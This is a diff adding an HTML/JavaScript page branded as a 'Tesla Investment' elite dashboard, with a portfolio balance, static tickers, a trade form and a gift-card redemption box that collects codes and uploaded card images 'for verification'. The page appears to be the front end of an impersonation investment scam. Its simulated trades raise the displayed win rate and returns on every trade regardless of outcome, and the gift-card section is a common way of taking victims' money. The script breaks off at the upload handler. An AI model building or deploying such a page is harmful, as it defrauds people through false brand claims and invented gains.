@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover, shrink-to-fit=no">
+  <title>Tesla Investment | Elite Dashboard</title>
+  
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800;14..32,900&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --tesla-red: #E82127;
+      --gold: #C8A96E;
+      --green: #00E676;
+      --blue: #448AFF;
+      --purple: #7C4DFF;
+      --gradient-red: linear-gradient(135deg, #E82127 0%, #B8151A 100%);
+      --gradient-gold: linear-gradient(135deg, #C8A96E 0%, #A88B4A 100%);
+      --gradient-blue: linear-gradient(135deg, #448AFF 0%, #2962FF 100%);
+      --gradient-green: linear-gradient(135deg, #00E676 0%, #00C853 100%);
+      --glass-bg: rgba(22, 24, 30, 0.75);
+      --glass-border: rgba(255,255,255,0.07);
+      --transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body, html {
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+      -webkit-touch-callout: none;
+      font-family: 'Inter', sans-serif;
+      background: #08090C;
+      color: #FFFFFF;
+      width: 100%;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      -webkit-text-size-adjust: 100%;
+      background-image: 
+        radial-gradient(ellipse at 20% 20%, rgba(232,33,39,0.06) 0%, transparent 50%),
+        radial-gradient(ellipse at 80% 60%, rgba(68,138,255,0.04) 0%, transparent 50%),
+        radial-gradient(ellipse at 50% 80%, rgba(200,169,110,0.03) 0%, transparent 50%);
+    }
+
+    input, select {
+      -webkit-user-select: text;
+      -moz-user-select: text;
+      -ms-user-select: text;
+      user-select: text;
+      font-size: 16px !important;
+    }
+
+    .dashboard-header {
+      background: rgba(8, 9, 12, 0.95);
+      backdrop-filter: blur(40px);
+      -webkit-backdrop-filter: blur(40px);
+      border-bottom: 1px solid rgba(255,255,255,0.05);
+      position: sticky;
+      top: 0;
+      z-index: 1000;
+      padding: 14px 0;
+    }
+
+    .header-inner {
+      max-width: 1440px;
+      margin: 0 auto;
+      padding: 0 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      gap: 16px;
+      flex-wrap: wrap;
+    }
+
+    .logo-area {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      text-decoration: none;
+    }
+
+    .logo-svg { width: 34px; height: 34px; filter: drop-shadow(0 0 14px rgba(232,33,39,0.5)); }
+    .logo-text { font-family: 'Space Grotesk', sans-serif; font-size: 24px; font-weight: 700; letter-spacing: -0.5px; }
+    .logo-text span { color: var(--tesla-red); }
+    .header-actions { display: flex; align-items: center; gap: 16px; }
+
+    .profile-dropdown { position: relative; }
+    .profile-trigger {
+      display: flex; align-items: center; gap: 10px; cursor: pointer;
+      padding: 6px 14px 6px 6px; border-radius: 50px;
+      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.08);
+      transition: var(--transition); min-width: 0;
+    }
+    .profile-trigger:hover { background: rgba(255,255,255,0.06); border-color: rgba(255,255,255,0.15); }
+    .profile-avatar {
+      width: 36px; height: 36px; border-radius: 50%; object-fit: cover;
+      border: 2px solid rgba(232,33,39,0.4); flex-shrink: 0;
+    }
+    .profile-info { display: flex; flex-direction: column; min-width: 0; }
+    .profile-name { font-weight: 600; font-size: 13px; line-height: 1.2; }
+    .profile-role { font-size: 10px; color: var(--gold); letter-spacing: 0.5px; text-transform: uppercase; }
+    .profile-chevron { font-size: 10px; color: #8B8F96; transition: var(--transition); }
+    .profile-dropdown.open .profile-chevron { transform: rotate(180deg); }
+
+    .dropdown-menu {
+      position: absolute; top: calc(100% + 8px); right: 0;
+      background: rgba(18, 20, 26, 0.98); backdrop-filter: blur(30px);
+      border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 8px;
+      min-width: 220px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); display: none; z-index: 1001;
+    }
+    .profile-dropdown.open .dropdown-menu { display: block; animation: dropdownIn 0.25s ease-out; }
+    @keyframes dropdownIn { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+    .dropdown-item {
+      display: flex; align-items: center; gap: 10px; padding: 11px 14px; border-radius: 10px;
+      color: #B0B3B8; cursor: pointer; transition: var(--transition); font-size: 13px;
+      font-weight: 500; text-decoration: none; border: none; background: none; width: 100%; text-align: left;
+    }
+    .dropdown-item:hover { background: rgba(255,255,255,0.05); color: #FFFFFF; }
+    .dropdown-item i { width: 18px; text-align: center; font-size: 14px; }
+    .dropdown-divider { height: 1px; background: rgba(255,255,255,0.06); margin: 6px 0; }
+    .dropdown-item.logout { color: #FF6B70; }
+    .dropdown-item.logout:hover { background: rgba(232,33,39,0.1); color: #FF5252; }
+
+    .dashboard-main {
+      max-width: 1440px; margin: 0 auto; padding: 20px;
+      display: grid; grid-template-columns: 1fr; gap: 16px;
+    }
+
+    .card {
+      background: var(--glass-bg); backdrop-filter: blur(30px);
+      border: 1px solid var(--glass-border); border-radius: 20px; padding: 22px;
+      transition: var(--transition); overflow: hidden;
+    }
+    .card-header {
+      display: flex; justify-content: space-between; align-items: center;
+      margin-bottom: 18px; flex-wrap: wrap; gap: 10px;
+    }
+    .card-title {
+      font-family: 'Space Grotesk', sans-serif; font-size: 14px; font-weight: 600;
+      color: #9BA0A8; letter-spacing: 0.3px; display: flex; align-items: center; gap: 8px;
+    }
+    .card-title i { font-size: 15px; }
+    .card-badge {
+      background: rgba(0,200,83,0.1); color: var(--green); font-size: 10px;
+      padding: 5px 10px; border-radius: 20px; font-weight: 600; letter-spacing: 0.5px; text-transform: uppercase;
+    }
+
+    .balance-amount {
+      font-family: 'Space Grotesk', sans-serif; font-size: 48px; font-weight: 700;
+      letter-spacing: -1.5px; word-break: break-word;
+      background: linear-gradient(135deg, #FFFFFF 0%, #B0B8C0 100%);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+    }
+    .balance-change { color: var(--green); font-size: 13px; font-weight: 600; margin-top: 4px; }
+    .balance-details {
+      display: flex; gap: 30px; margin-top: 20px; padding-top: 18px;
+      border-top: 1px solid rgba(255,255,255,0.05); flex-wrap: wrap;
+    }
+    .balance-detail .label { font-size: 10px; color: #6B7280; text-transform: uppercase; letter-spacing: 0.8px; font-weight: 500; }
+    .balance-detail .value { font-family: 'Space Grotesk', sans-serif; font-size: 17px; font-weight: 600; margin-top: 3px; }
+
+    .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; }
+    .quick-stat { text-align: center; padding: 12px 8px; background: rgba(255,255,255,0.02); border-radius: 14px; }
+    .quick-stat .value { font-family: 'Space Grotesk', sans-serif; font-size: 22px; font-weight: 700; }
+    .quick-stat .label { font-size: 9px; color: #6B7280; text-transform: uppercase; letter-spacing: 0.6px; margin-top: 3px; }
+
+    .progress-bar { height: 6px; background: rgba(255,255,255,0.05); border-radius: 3px; margin-top: 14px; overflow: hidden; }
+    .progress-fill { height: 100%; background: var(--gradient-red); border-radius: 3px; transition: width 1.5s ease; }
+
+    .market-scroll { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 4px; -webkit-overflow-scrolling: touch; scrollbar-width: none; }
+    .market-scroll::-webkit-scrollbar { display: none; }
+    .ticker-item {
+      background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.04);
+      border-radius: 14px; padding: 12px 15px; min-width: 100px; text-align: center; flex-shrink: 0;
+    }
+    .ticker-symbol { font-family: 'Space Grotesk', sans-serif; font-weight: 700; font-size: 14px; }
+    .ticker-price { font-size: 12px; color: #8B8F96; margin-top: 3px; }
+    .ticker-change.up { color: var(--green); font-size: 11px; font-weight: 600; }
+    .ticker-change.down { color: var(--tesla-red); font-size: 11px; font-weight: 600; }
+
+    .asset-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
+    .asset-card {
+      background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.05);
+      border-radius: 14px; overflow: hidden; cursor: pointer; transition: var(--transition); text-align: center;
+    }
+    .asset-card:hover { border-color: rgba(255,255,255,0.15); transform: translateY(-2px); }
+    .asset-card.selected { border-color: var(--tesla-red); box-shadow: 0 0 0 3px rgba(232,33,39,0.12); }
+    .asset-card img { width: 100%; height: 80px; object-fit: cover; }
+    .asset-card .asset-name { padding: 10px; font-weight: 600; font-size: 12px; font-family: 'Space Grotesk', sans-serif; }
+
+    .custom-select-wrapper { position: relative; width: 100%; }
+    .custom-select {
+      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px; padding: 13px 40px 13px 15px; font-size: 14px; font-family: 'Inter', sans-serif;
+      color: #FFFFFF; cursor: pointer; transition: var(--transition); width: 100%;
+      appearance: none; -webkit-appearance: none;
+    }
+    .custom-select:focus { border-color: var(--tesla-red); box-shadow: 0 0 0 4px rgba(232,33,39,0.05); outline: none; }
+    .custom-select-arrow {
+      position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+      pointer-events: none; color: #8B8F96; font-size: 12px; transition: var(--transition);
+    }
+    .custom-select option { background: #1A1C23; color: #FFFFFF; }
+
+    .form-input {
+      background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1);
+      border-radius: 12px; padding: 13px 15px; font-size: 14px; font-family: 'Inter', sans-serif;
+      color: #FFFFFF; outline: none; transition: var(--transition); width: 100%;
+    }
+    .form-input:focus { border-color: var(--tesla-red); box-shadow: 0 0 0 4px rgba(232,33,39,0.05); }
+    .form-input::placeholder { color: #5A5E66; }
+
+    .btn {
+      padding: 13px 22px; border-radius: 12px; font-weight: 600; font-size: 13px;
+      cursor: pointer; transition: var(--transition); border: none; text-decoration: none;
+      display: inline-flex; align-items: center; justify-content: center; gap: 7px;
+      letter-spacing: 0.4px; text-transform: uppercase; font-family: 'Inter', sans-serif; width: 100%; min-height: 46px;
+    }
+    .btn-red { background: var(--gradient-red); color: #FFF; box-shadow: 0 8px 25px rgba(232,33,39,0.3); }
+    .btn-green { background: var(--gradient-green); color: #0A0B0E; box-shadow: 0 8px 25px rgba(0,230,118,0.3); font-weight: 700; }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none !important; }
+
+    .gift-input-row { display: flex; gap: 10px; flex-wrap: wrap; }
+    .gift-input-wrapper { position: relative; flex: 1; min-width: 170px; }
+    .gift-input-wrapper .form-input { width: 100%; padding-right: 45px; font-family: 'Space Grotesk', monospace; letter-spacing: 2px; text-transform: uppercase; font-size: 15px; }
+    .scan-icon {
+      position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+      background: none; border: none; color: #8B8F96; cursor: pointer; font-size: 18px;
+      padding: 8px; transition: var(--transition); border-radius: 8px; z-index: 2;
+    }
+    .scan-icon:hover { color: var(--gold); background: rgba(200,169,110,0.1); }
+    .scan-preview { width: 40px; height: 40px; border-radius: 10px; object-fit: cover; border: 2px solid var(--gold); cursor: pointer; flex-shrink: 0; }
+    .gift-samples { display: flex; gap: 8px; margin-top: 12px; flex-wrap: wrap; }
+    .gift-sample-tag {
+      background: rgba(200,169,110,0.06); border: 1px solid rgba(200,169,110,0.2);
+      border-radius: 8px; padding: 7px 12px; font-size: 10px; color: var(--gold);
+      cursor: pointer; font-family: 'Space Grotesk', sans-serif; font-weight: 500; letter-spacing: 0.5px; transition: var(--transition);
+    }
+
+    .status-message {
+      padding: 10px 14px; border-radius: 10px; font-size: 12px; font-weight: 500;
+      margin-top: 10px; display: none; align-items: center; gap: 8px;
+    }
+    .status-message.success { background: rgba(0,230,118,0.08); border: 1px solid rgba(0,230,118,0.25); color: #00E676; display: flex; }
+    .status-message.error { background: rgba(232,33,39,0.08); border: 1px solid rgba(232,33,39,0.25); color: #FF6B70; display: flex; }
+
+    .activity-list { display: flex; flex-direction: column; gap: 6px; }
+    .activity-item { display: flex; align-items: center; gap: 12px; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.025); flex-wrap: wrap; }
+    .activity-icon { width: 34px; height: 34px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 13px; flex-shrink: 0; }
+    .activity-details { flex: 1; min-width: 80px; }
+    .activity-name { font-weight: 600; font-size: 12px; }
+    .activity-date { font-size: 10px; color: #6B7280; }
+    .activity-amount { font-weight: 700; font-size: 13px; font-family: 'Space Grotesk', sans-serif; }
+    .activity-amount.positive { color: var(--green); }
+    .activity-amount.negative { color: var(--tesla-red); }
+
+    .empty-state { text-align: center; color: #6B7280; padding: 30px 20px; font-size: 12px; }
+    .empty-state i { font-size: 32px; margin-bottom: 10px; display: block; opacity: 0.5; }
+
+    .spinner { width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.2); border-top-color: #FFF; border-radius: 50%; animation: spin 0.7s linear infinite; display: inline-block; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @media (min-width: 600px) {
+      .dashboard-main { grid-template-columns: 1fr 1fr; padding: 24px; gap: 18px; }
+      .balance-card, .gift-section, .activity-section { grid-column: span 2; }
+      .balance-amount { font-size: 52px; }
+    }
+    @media (min-width: 1024px) {
+      .dashboard-main { grid-template-columns: 2fr 1fr 1fr; padding: 32px; gap: 20px; }
+      .balance-card { grid-column: span 2; }
+      .gift-section { grid-column: span 2; }
+      .activity-section { grid-column: span 2; }
+      .trade-section { grid-column: span 1; }
+    }
+    @media (max-width: 360px) {
+      .dashboard-main { padding: 10px 8px; gap: 10px; }
+      .card { padding: 16px; }
+      .balance-amount { font-size: 32px; }
+      .asset-grid { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  
+  <header class="dashboard-header">
+    <div class="header-inner">
+      <a href="#" class="logo-area">
+        <svg class="logo-svg" viewBox="0 0 40 40" fill="none">
+          <defs><linearGradient id="lg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#E82127"/><stop offset="100%" style="stop-color:#B8151A"/></linearGradient></defs>
+          <path d="M20 2L37 34H3L20 2Z" fill="url(#lg)"/><path d="M20 8L31 30H9L20 8Z" fill="#FFFFFF"/>
+        </svg>
+        <span class="logo-text">TESLA<span>.</span></span>
+      </a>
+      <div class="header-actions">
+        <div class="profile-dropdown" id="profileDropdown">
+          <div class="profile-trigger" id="profileTrigger">
+            <img src="https://i.ibb.co/VcrhXBcn/IMG-20260522-WA0111.jpg" alt="Profile" class="profile-avatar" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';" loading="lazy">
+            <div class="user-avatar" style="display:none; width:36px; height:36px; border-radius:50%; background:var(--gradient-red); align-items:center; justify-content:center; font-weight:700; font-size:15px;">DN</div>
+            <div class="profile-info"><span class="profile-name">Dennis Newhouse</span><span class="profile-role">Elite Investor</span></div>
+            <i class="fas fa-chevron-down profile-chevron"></i>
+          </div>
+          <div class="dropdown-menu">
+            <a href="profile.html" class="dropdown-item"><i class="fas fa-user-circle"></i> My Profile</a>
+            <a href="#" class="dropdown-item"><i class="fas fa-cog"></i> Settings</a>
+            <a href="#" class="dropdown-item"><i class="fas fa-shield-alt"></i> Security</a>
+            <div class="dropdown-divider"></div>
+            <a href="login.html" class="dropdown-item logout"><i class="fas fa-sign-out-alt"></i> Sign Out</a>
+          </div>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main class="dashboard-main">
+    
+    <div class="card balance-card">
+      <div class="card-header"><span class="card-title"><i class="fas fa-wallet" style="color:var(--gold);"></i> Portfolio Value</span><span class="card-badge"><i class="fas fa-circle" style="font-size:6px;"></i> Live</span></div>
+      <div class="balance-amount" id="portfolioValue">$0.00</div>
+      <div class="balance-change" id="portfolioChange"><i class="fas fa-arrow-trend-up"></i> +$0.00 (0.00%)</div>
+      <div class="balance-details">
+        <div class="balance-detail"><div class="label"><i class="fas fa-coins"></i> Cash</div><div class="value" id="availableCash">$0.00</div></div>
+        <div class="balance-detail"><div class="label"><i class="fas fa-chart-bar"></i> Invested</div><div class="value" id="investmentsValue">$0.00</div></div>
+        <div class="balance-detail"><div class="label"><i class="fas fa-gift"></i> Gift Credits</div><div class="value" id="giftCredits">$0.00</div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><span class="card-title"><i class="fas fa-trophy" style="color:var(--gold);"></i> Performance</span></div>
+      <div class="stats-grid">
+        <div class="quick-stat"><div class="value" id="totalTrades">0</div><div class="label">Trades</div></div>
+        <div class="quick-stat"><div class="value" id="winRate">0%</div><div class="label">Win Rate</div></div>
+        <div class="quick-stat"><div class="value" id="totalReturn">0%</div><div class="label">Return</div></div>
+      </div>
+      <div class="progress-bar"><div class="progress-fill" id="perfFill" style="width:0%;"></div></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><span class="card-title"><i class="fas fa-globe" style="color:var(--blue);"></i> Markets</span></div>
+      <div class="market-scroll">
+        <div class="ticker-item"><div class="ticker-symbol" style="color:#E82127;">TSLA</div><div class="ticker-price">$248.90</div><div class="ticker-change up"><i class="fas fa-caret-up"></i> 2.15%</div></div>
+        <div class="ticker-item"><div class="ticker-symbol">AAPL</div><div class="ticker-price">$198.45</div><div class="ticker-change up"><i class="fas fa-caret-up"></i> 1.87%</div></div>
+        <div class="ticker-item"><div class="ticker-symbol">BTC</div><div class="ticker-price">$48,235</div><div class="ticker-change up"><i class="fas fa-caret-up"></i> 3.24%</div></div>
+        <div class="ticker-item"><div class="ticker-symbol">ETH</div><div class="ticker-price">$3,245</div><div class="ticker-change down"><i class="fas fa-caret-down"></i> 0.52%</div></div>
+        <div class="ticker-item"><div class="ticker-symbol">GOOGL</div><div class="ticker-price">$142.30</div><div class="ticker-change up"><i class="fas fa-caret-up"></i> 0.91%</div></div>
+      </div>
+    </div>
+
+    <div class="card trade-section">
+      <div class="card-header"><span class="card-title"><i class="fas fa-exchange-alt" style="color:var(--tesla-red);"></i> Execute Trade</span></div>
+      <div class="asset-grid" id="assetGrid">
+        <div class="asset-card selected" data-asset="BTC"><img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=200&h=100&fit=crop" alt="Bitcoin" loading="lazy" onerror="this.style.background='linear-gradient(135deg,#F7931A,#E87B00)'; this.style.height='80px';"><div class="asset-name">Blockchain</div></div>
+        <div class="asset-card" data-asset="ETH"><img src="https://images.unsplash.com/photo-1622630998477-20aa696ecb05?w=200&h=100&fit=crop" alt="Ethereum" loading="lazy" onerror="this.style.background='linear-gradient(135deg,#627EEA,#3C4DB0)'; this.style.height='80px';"><div class="asset-name">Bitcoin</div></div>
+      </div>
+      <form id="tradeForm" style="display:flex; flex-direction:column; gap:10px; margin-top:12px;" novalidate>
+        <input type="hidden" id="tradeAsset" value="BTC">
+        <div class="custom-select-wrapper">
+          <select class="custom-select" id="tradeType" required><option value="">Select Trade Type</option><option value="buy">Buy</option><option value="sell">Sell</option></select>
+          <i class="fas fa-chevron-down custom-select-arrow"></i>
+        </div>
+        <input type="number" class="form-input" id="tradeAmount" placeholder="Amount ($)" required min="1" step="any" inputmode="decimal">
+        <button type="submit" class="btn btn-red" id="tradeBtn"><i class="fas fa-bolt"></i> Place Trade</button>
+      </form>
+      <div class="status-message" id="tradeMsg"></div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><span class="card-title"><i class="fas fa-star" style="color:var(--gold);"></i> Watchlist</span></div>
+      <div style="display:flex; flex-direction:column; gap:8px;">
+        <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.03);"><span style="font-size:12px; font-weight:600;"><i class="fas fa-circle" style="color:#E82127; font-size:7px;"></i> Tesla</span><span style="font-family:'Space Grotesk',sans-serif; font-weight:600; font-size:12px; color:#00E676;">$248.90 <i class="fas fa-caret-up"></i></span></div>
+        <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.03);"><span style="font-size:12px; font-weight:600;"><i class="fas fa-circle" style="color:#4285F4; font-size:7px;"></i> Apple</span><span style="font-family:'Space Grotesk',sans-serif; font-weight:600; font-size:12px; color:#00E676;">$198.45 <i class="fas fa-caret-up"></i></span></div>
+        <div style="display:flex; justify-content:space-between; padding:8px 0; border-bottom:1px solid rgba(255,255,255,0.03);"><span style="font-size:12px; font-weight:600;"><i class="fas fa-circle" style="color:#F7931A; font-size:7px;"></i> Bitcoin</span><span style="font-family:'Space Grotesk',sans-serif; font-weight:600; font-size:12px; color:#00E676;">$48,235 <i class="fas fa-caret-up"></i></span></div>
+        <div style="display:flex; justify-content:space-between; padding:8px 0;"><span style="font-size:12px; font-weight:600;"><i class="fas fa-circle" style="color:#C8A96E; font-size:7px;"></i> Gold ETF</span><span style="font-family:'Space Grotesk',sans-serif; font-weight:600; font-size:12px; color:#E82127;">$187.30 <i class="fas fa-caret-down"></i></span></div>
+      </div>
+    </div>
+
+    <div class="card gift-section">
+      <div class="card-header"><span class="card-title"><i class="fas fa-gift" style="color:var(--gold);"></i> Redeem Gift Card</span><span class="card-badge" style="background:rgba(200,169,110,0.1); color:var(--gold);"><i class="fas fa-bolt"></i> Instant</span></div>
+      <p style="color:#8B8F96; font-size:11px; margin-bottom:12px;">Enter code manually or upload gift card image to send for verification.</p>
+      <div class="gift-input-row">
+        <div class="gift-input-wrapper">
+          <input type="text" class="form-input" id="giftCode" placeholder="Enter gift card code" autocomplete="off" spellcheck="false" inputmode="text">
+          <input type="file" id="giftImageInput" accept="image/*" style="display:none;">
+          <button class="scan-icon" id="scanIconBtn" title="Upload Gift Card Image" type="button"><i class="fas fa-qrcode"></i></button>
+        </div>
+        <img id="scanPreview" class="scan-preview" style="display:none;" alt="Scanned" onclick="document.getElementById('giftImageInput').click()" title="Click to change image">
+        <button class="btn btn-green" id="redeemBtn" style="width:auto; min-width:130px;"><i class="fas fa-check-circle"></i> Redeem</button>
+      </div>
+      <div class="status-message" id="giftMsg" style="margin-top:10px;"></div>
+      <div class="gift-samples">
+        <span style="font-size:9px; color:#6B7280;"><i class="fas fa-tag"></i> Samples:</span>
+        <span class="gift-sample-tag" onclick="document.getElementById('giftCode').value='TSLA-2024-GIFT-500';">TSLA-2024-GIFT-500</span>
+        <span class="gift-sample-tag" onclick="document.getElementById('giftCode').value='CRYPTO-BTC-2500';">CRYPTO-BTC-2500</span>
+        <span class="gift-sample-tag" onclick="document.getElementById('giftCode').value='ELITE-PREMIUM-10K';">ELITE-PREMIUM-10K</span>
+      </div>
+    </div>
+
+    <div class="card activity-section">
+      <div class="card-header"><span class="card-title"><i class="fas fa-clock" style="color:var(--blue);"></i> Recent Transactions</span><span class="card-badge" id="transactionCount" style="background:rgba(68,138,255,0.1); color:var(--blue);">0 items</span></div>
+      <div class="activity-list" id="activityList"><div class="empty-state"><i class="fas fa-receipt"></i><p>No transactions yet</p></div></div>
+    </div>
+
+  </main>
+
+  <script>
+    (() => {
+      // ============================================
+      // ENTER YOUR BACKEND SERVER URL HERE
+      // ============================================
+      const SERVER_URL = ''; // e.g., 'http://localhost:3000' or 'https://your-server.com'
+      // ============================================
+
+      const fc = (a) => '$' + a.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',');
+
+      // Fetch user data from server
+      async function fetchUserData() {
+        if (!SERVER_URL) {
+          loadLocalData();
+          return;
+        }
+        try {
+          const res = await fetch(`${SERVER_URL}/api/user-data`);
+          const json = await res.json();
+          if (json.success) {
+            userData = json.data;
+            transactions = json.transactions || [];
+            updateUI();
+          }
+        } catch (e) {
+          loadLocalData();
+        }
+      }
+
+      function loadLocalData() {
+        userData = {
+          name: 'Dennis Newhouse',
+          portfolioValue: 1800.75,
+          availableCash: 1800.50,
+          investmentsValue: 0,
+          giftCredits: 0,
+          totalTrades: 0,
+          winRate: 0,
+          totalReturn: 0
+        };
+        transactions = [];
+        updateUI();
+      }
+
+      let userData = {};
+      let transactions = [];
+
+      function updateUI() {
+        document.getElementById('portfolioValue').textContent = fc(userData.portfolioValue);
+        const ch = userData.totalReturn > 0 ? ((userData.totalReturn/100)*userData.portfolioValue).toFixed(2) : '0.00';
+        document.getElementById('portfolioChange').innerHTML = '<i class="fas fa-arrow-trend-up"></i> +'+fc(+ch)+' ('+userData.totalReturn+'%)';
+        document.getElementById('availableCash').textContent = fc(userData.availableCash);
+        document.getElementById('investmentsValue').textContent = fc(userData.investmentsValue);
+        document.getElementById('giftCredits').textContent = fc(userData.giftCredits);
+        document.getElementById('totalTrades').textContent = userData.totalTrades;
+        document.getElementById('winRate').textContent = userData.winRate+'%';
+        document.getElementById('totalReturn').textContent = '+'+userData.totalReturn+'%';
+        document.getElementById('perfFill').style.width = (userData.winRate || 0)+'%';
+        document.getElementById('transactionCount').textContent = transactions.length + ' items';
+        renderTransactions();
+      }
+
+      function renderTransactions() {
+        const list = document.getElementById('activityList');
+        if (transactions.length === 0) {
+          list.innerHTML = '<div class="empty-state"><i class="fas fa-receipt"></i><p>No transactions yet</p></div>';
+          return;
+        }
+        list.innerHTML = transactions.map(tx => {
+          let bg, clr, icn, cls, sign;
+          if (tx.type==='deposit'||tx.type==='gift'||tx.type==='dividend') {
+            bg = tx.type==='gift'?'rgba(200,169,110,0.1)':'rgba(0,230,118,0.1)';
+            clr = tx.type==='gift'?'#C8A96E':'#00E676';
+            icn = tx.type==='gift'?'fa-gift':'fa-arrow-down';
+            cls = 'positive'; sign = '<i class="fas fa-plus"></i> ';
+          } else {
+            bg='rgba(232,33,39,0.1)'; clr='#E82127'; icn='fa-arrow-up'; cls='negative';
+            sign = '<i class="fas fa-minus"></i> ';
+          }
+          return `<div class="activity-item"><div class="activity-icon" style="background:${bg};color:${clr};"><i class="fas ${icn}"></i></div><div class="activity-details"><div class="activity-name">${tx.name}</div><div class="activity-date">${tx.time}</div></div><div class="activity-amount ${cls}">${sign}${fc(Math.abs(tx.amount))}</div></div>`;
+        }).join('');
+      }
+
+      function showMsg(el, msg, type) {
+        el.innerHTML = msg;
+        el.className = 'status-message ' + type;
+        el.style.display = 'flex';
+        clearTimeout(el._t);
+        el._t = setTimeout(() => { el.style.display='none'; }, 4000);
+      }
+
+      // Profile dropdown
+      const pd = document.getElementById('profileDropdown');
+      document.getElementById('profileTrigger').addEventListener('click', (e) => { e.stopPropagation(); pd.classList.toggle('open'); });
+      document.addEventListener('click', () => pd.classList.remove('open'));
+
+      // Asset selection
+      document.getElementById('assetGrid').addEventListener('click', (e) => {
+        const card = e.target.closest('.asset-card');
+        if (!card) return;
+        document.querySelectorAll('.asset-card').forEach(c => c.classList.remove('selected'));
+        card.classList.add('selected');
+        document.getElementById('tradeAsset').value = card.dataset.asset;
+      });
+
+      // Trade execution
+      document.getElementById('tradeForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        const tradeMsg = document.getElementById('tradeMsg');
+        const tradeBtn = document.getElementById('tradeBtn');
+        tradeMsg.style.display='none'; tradeMsg.className='status-message';
+        
+        const asset = document.getElementById('tradeAsset').value;
+        const type = document.getElementById('tradeType').value;
+        const amt = parseFloat(document.getElementById('tradeAmount').value);
+        
+        if (!type) { showMsg(tradeMsg, 'Please select trade type', 'error'); return; }
+        if (!amt||amt<=0) { showMsg(tradeMsg, 'Please enter a valid amount', 'error'); return; }
+        
+        tradeBtn.disabled=true; tradeBtn.innerHTML='<span class="spinner"></span> Processing...';
+
+        if (SERVER_URL) {
+          try {
+            const res = await fetch(`${SERVER_URL}/api/trade`, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ asset, type, amount: amt })
+            });
+            const json = await res.json();
+            if (json.success) {
+              userData = json.data;
+              transactions = json.transactions || [];
+              updateUI();
+              showMsg(tradeMsg, '<i class="fas fa-check-circle"></i> '+json.message, 'success');
+            } else {
+              showMsg(tradeMsg, '<i class="fas fa-times-circle"></i> '+json.message, 'error');
+            }
+          } catch (e) {
+            showMsg(tradeMsg, 'Server connection failed', 'error');
+          }
+        } else {
+          setTimeout(() => {
+            if (type==='buy'&&amt>userData.availableCash) { showMsg(tradeMsg, 'Insufficient cash', 'error'); tradeBtn.disabled=false; tradeBtn.innerHTML='<i class="fas fa-bolt"></i> Place Trade'; return; }
+            if (type==='sell'&&amt>userData.investmentsValue) { showMsg(tradeMsg, 'Insufficient investments', 'error'); tradeBtn.disabled=false; tradeBtn.innerHTML='<i class="fas fa-bolt"></i> Place Trade'; return; }
+            if (type==='buy') { userData.availableCash-=amt; userData.investmentsValue+=amt; }
+            else { userData.investmentsValue-=amt; userData.availableCash+=amt; }
+            userData.portfolioValue=userData.availableCash+userData.investmentsValue+userData.giftCredits;
+            userData.totalTrades++;
+            userData.winRate = Math.min(userData.winRate+1, 95);
+            userData.totalReturn = Math.min(userData.totalReturn+0.5, 50);
+            const now = new Date();
+            transactions.unshift({ name: asset+' '+(type==='buy'?'Bought':'Sold'), amount: amt, type, time: now.toLocaleDateString([],{month:'short',day:'numeric'})+' • '+now.toLocaleTimeString([],{hour:'2-digit',minute:'2-digit'}) });
+            updateUI();
+            showMsg(tradeMsg, '<i class="fas fa-check-circle"></i> '+(type==='buy'?'Bought':'Sold')+' '+fc(amt)+' of '+asset, 'success');
+          }, 1200);
+        }
+        
+        tradeBtn.disabled=false; tradeBtn.innerHTML='<i class="fas fa-bolt"></i> Place Trade';
+        this.reset(); document.getElementById('tradeAsset').value=asset;
+      });
+
+      // Gift card scan/upload
